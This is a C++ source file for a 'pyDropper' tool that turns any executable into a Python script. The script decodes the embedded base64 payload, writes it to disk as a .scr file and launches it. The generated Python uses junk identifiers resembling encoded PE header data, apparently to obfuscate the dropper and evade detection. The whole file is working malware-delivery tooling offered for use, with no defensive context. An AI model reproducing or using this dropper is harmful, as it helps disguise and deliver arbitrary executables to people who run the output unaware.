// pyDropper-basic.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <vector>
#include <string>
#include <fstream>

#include "b64.h"

int main(int argc, char* argv[]) {
	// Check is the user provided a file to encode
    if (argc != 2) {
        std::cout << "Usage: " << argv[0] << " <executable to drop>" << std::endl;
        return 1;
    }
    
    // Read the input file to an std::vector<char>
    std::ifstream inFile(argv[1], std::ios::binary);
    if (!inFile.is_open()) {
        std::cout << "Error: Could not open input file" << std::endl;
        return 1;
    }
    std::vector<char> data;
    char c;
    while (inFile.get(c)) {
        data.push_back(c);
    }
    
	// Generate some python code that decodes the base64 encoded input file, writes it to a file and executes it
    std::string pythonCode;
    pythonCode += "def ugwhSaWNoIG6DCAAAAAAAAAAAAAAAAAAAAABQRQAAZIYGAJLfc2MAAAAAAAAAAPAAIgALAg4hAA4AAAAgAAAAAAAA0BIAAAAQAAAAAABAAQAAAAAQAAAAAgAABgAAAAAAAAAGAAAAAAAAAACAAAAABAAAAAAAAAMAYIEAABAAAAAAAAAQAAAAAAAAAAAQAAAAAAAAEAAAAAAAAAAAAAAQAAAAAAAAAAAAAADUKgAAtAAAAABgAADgAQAAAFAAAGgBAAAAAAAAAAAAAABwAAAwAAAAECYAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADQJAAAQAEAAAAAAAAAAAAAACAAALABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAudGV4dAAAADwNAAAAEAAAAA4AAAAEAAAAAAAAAAAAAAAAAAAgAABgLnJkYXRhAACoEQAAACAAAAASAAAAEgAAAAAAAAAAAAAAAAAAQAAAQC5kYXRhAAAAOAYAAABAAAAAAgAAACQAAAAAAAAAAAAAAAAAAEAAAMAucGRhdGEAAGgBAAAAUAAAAAIAA():\n";
    pythonCode += "    import base64\n";
    pythonCode += "    import subprocess\n";
    pythonCode += "    bh7B6b76B76B76vVvhVJHfJHiljOIJ98YTRDtrdDRT54d54Ed456CTYvgbJKOiIOUuighUYytfyTFuytUUYHBUYV765uyv = b'" + base64_encode(data) + "'\n";
    pythonCode += "    xAAAAAAAAGjEAAAAAAAAwMQAAAAAAAIoxAAAAAAAAdjEAAAAAAABgMQAAAAAAAEYxAAAAAAAAQDAAAAAAAAAAAAAAAAAAAGgtAAAAAAAAWi0AAAAAAAAAAAAAAAAAAJotAAAAAAAAsC0AAAAAAADOLQAAAAAAAIItAAAAAAAAnjEAAAAAAAAAAAAAAAAAACovAAAAAAAAAAAAAAAAAAAULwAAAAAAAAAAAAAAAAAADC4AAAAAAAAAAAAAAAAAAGYvAAAAAAAAgi8AAAAAAADqLQAAAAAAAJAvAAAAAAAA5i4AAAAAAADcLgAAAAAAANIuAAAAAAAAxC4AAAAAAAC2LgAAAAAAAPwtAAAAAAAAoC4AAAAAAACYLgAAAAAAAIouAAAAAAAAfi4AAAAAAABcLgAAAAAAADouAAAAAAAAIC4AAAAAAABKLwAAAAAAAAAAAAAAAAAAOi8AAAAAAACoLgAAAAAAAAAAAAAAAAAAEAJHZXRDb25zb2xlV2luZG93AABLRVJORUwzMi5kbGwAAI0DU2hvd1dpbmRvdwAAjAJNZXNzYWdlQm94VwBVU0VSMzIuZGxsAAAIAF9fQ19zcGVjaWZpY19oYW5kbGVyAAAbAF9fY3VycmVudF9leGNlcHRpb24AHABfX2N1cnJlbnRfZXhjZXB0aW9uX2NvbnRleHQAPgBtZW1zZXQAAFZDUlVOVElNRTE0MC5kbGwAAEAAX3NlaF9maWx0ZXJfZXhlAEIAX3NldF9hcHBfdHlwZQAJAF9fc2V0dXNlcm1hdGhlcnIAABgAX2NvbmZpZ3VyZV9uYXJyb3dfYXJndgAAMwBfaW5pdGlhbGl6ZV9uYXJyb3dfZW52aXJvbm1lbnQAACgAX2dldF9pbml0aWFsX25hcnJvd19lbnZpcm9ubWVudAA2AF9pbml0dGVybQA3AF9pbml0dGVybV9 = base64.b64decode(bh7B6b76B76B76vVvhVJHfJHiljOIJ98YTRDtrdDRT54d54Ed456CTYvgbJKOiIOUuighUYytfyTFuytUUYHBUYV765uyv)\n";
    pythonCode += "    with open('AAWRYAAAwqAABcFgAAlhYAAAwqAACYFg.scr', 'wb') as f:\n";
    pythonCode += "        f.write(xAAAAAAAAGjEAAAAAAAAwMQAAAAAAAIoxAAAAAAAAdjEAAAAAAABgMQAAAAAAAEYxAAAAAAAAQDAAAAAAAAAAAAAAAAAAAGgtAAAAAAAAWi0AAAAAAAAAAAAAAAAAAJotAAAAAAAAsC0AAAAAAADOLQAAAAAAAIItAAAAAAAAnjEAAAAAAAAAAAAAAAAAACovAAAAAAAAAAAAAAAAAAAULwAAAAAAAAAAAAAAAAAADC4AAAAAAAAAAAAAAAAAAGYvAAAAAAAAgi8AAAAAAADqLQAAAAAAAJAvAAAAAAAA5i4AAAAAAADcLgAAAAAAANIuAAAAAAAAxC4AAAAAAAC2LgAAAAAAAPwtAAAAAAAAoC4AAAAAAACYLgAAAAAAAIouAAAAAAAAfi4AAAAAAABcLgAAAAAAADouAAAAAAAAIC4AAAAAAABKLwAAAAAAAAAAAAAAAAAAOi8AAAAAAACoLgAAAAAAAAAAAAAAAAAAEAJHZXRDb25zb2xlV2luZG93AABLRVJORUwzMi5kbGwAAI0DU2hvd1dpbmRvdwAAjAJNZXNzYWdlQm94VwBVU0VSMzIuZGxsAAAIAF9fQ19zcGVjaWZpY19oYW5kbGVyAAAbAF9fY3VycmVudF9leGNlcHRpb24AHABfX2N1cnJlbnRfZXhjZXB0aW9uX2NvbnRleHQAPgBtZW1zZXQAAFZDUlVOVElNRTE0MC5kbGwAAEAAX3NlaF9maWx0ZXJfZXhlAEIAX3NldF9hcHBfdHlwZQAJAF9fc2V0dXNlcm1hdGhlcnIAABgAX2NvbmZpZ3VyZV9uYXJyb3dfYXJndgAAMwBfaW5pdGlhbGl6ZV9uYXJyb3dfZW52aXJvbm1lbnQAACgAX2dldF9pbml0aWFsX25hcnJvd19lbnZpcm9ubWVudAA2AF9pbml0dGVybQA3AF9pbml0dGVybV9)\n";
    pythonCode += "    subprocess.Popen('AAWRYAAAwqAABcFgAAlhYAAAwqAACYFg.scr')\n";
    pythonCode += "ugwhSaWNoIG6DCAAAAAAAAAAAAAAAAAAAAABQRQAAZIYGAJLfc2MAAAAAAAAAAPAAIgALAg4hAA4AAAAgAAAAAAAA0BIAAAAQAAAAAABAAQAAAAAQAAAAAgAABgAAAAAAAAAGAAAAAAAAAACAAAAABAAAAAAAAAMAYIEAABAAAAAAAAAQAAAAAAAAAAAQAAAAAAAAEAAAAAAAAAAAAAAQAAAAAAAAAAAAAADUKgAAtAAAAABgAADgAQAAAFAAAGgBAAAAAAAAAAAAAABwAAAwAAAAECYAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADQJAAAQAEAAAAAAAAAAAAAACAAALABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAudGV4dAAAADwNAAAAEAAAAA4AAAAEAAAAAAAAAAAAAAAAAAAgAABgLnJkYXRhAACoEQAAACAAAAASAAAAEgAAAAAAAAAAAAAAAAAAQAAAQC5kYXRhAAAAOAYAAABAAAAAAgAAACQAAAAAAAAAAAAAAAAAAEAAAMAucGRhdGEAAGgBAAAAUAAAAAIAA()\n";
    
	// Write the lovely python code to a file
    std::ofstream outFile("pyDrop-" + std::string(argv[1]) + ".py");
    outFile << pythonCode;
    outFile.close();
	std::cout << "Complete. Wrote file pyDrop-" << std::string(argv[1]) << ".py" << std::endl;
    
    return 0;
}